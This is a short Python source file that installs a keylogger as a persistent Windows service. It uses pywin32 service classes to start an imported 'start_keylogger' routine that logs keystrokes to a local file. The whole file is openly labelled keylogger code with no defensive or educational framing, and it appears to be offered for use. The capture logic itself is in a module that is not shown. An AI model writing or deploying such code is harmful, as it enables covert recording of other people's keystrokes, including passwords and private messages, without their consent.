import win32serviceutil
import win32service
import win32event
import servicemanager
import logging
import os
from keylogger import start_keylogger

class KeyloggerService(win32serviceutil.ServiceFramework):
    _svc_name_ = "KeyloggerService"
    _svc_display_name_ = "Keylogger Service"
    _svc_description_ = "A simple keylogger service"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.log_file = "C:\\path\\to\\your\\logfile.log"  # Change this to your log file path

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()

    def main(self):
        logging.basicConfig(
            filename=self.log_file,
            level=logging.DEBUG,
            format="%(asctime)s: %(message)s"
        )
        start_keylogger(self.log_file)

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(KeyloggerService)
